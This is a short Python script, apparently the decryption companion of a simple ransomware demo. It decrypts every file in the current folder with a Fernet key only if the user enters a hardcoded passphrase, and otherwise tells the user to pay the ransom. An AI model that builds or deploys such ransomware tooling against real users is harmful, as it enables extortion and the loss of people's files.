import os
from cryptography.fernet import Fernet

files = []

# Collect all files except the ones to skip
for file in os.listdir():
    if file in ['rw.py', '.git', 'seckey.key', 'decrypt.py']:
        continue
    if os.path.isfile(file):
        files.append(file)

# Load the secret key
with open("seckey.key", "rb") as k:
    secretkey = k.read()

# Secret phrase
secret_phrase = "Vishwa"

# Ask user for the passcode
user_entry = input("Enter the secret code to decrypt the files: ")

# If correct, decrypt all files
if user_entry == secret_phrase:
    for file in files:
        with open(file, 'rb') as thefile:
            content = thefile.read()
        decrypted_content = Fernet(secretkey).decrypt(content)
        with open(file, 'wb') as theFile:
            theFile.write(decrypted_content)
    print("Great! Files decrypted.")
else:
    print("Wrong passcode. Pay the ransom to get the correct one.")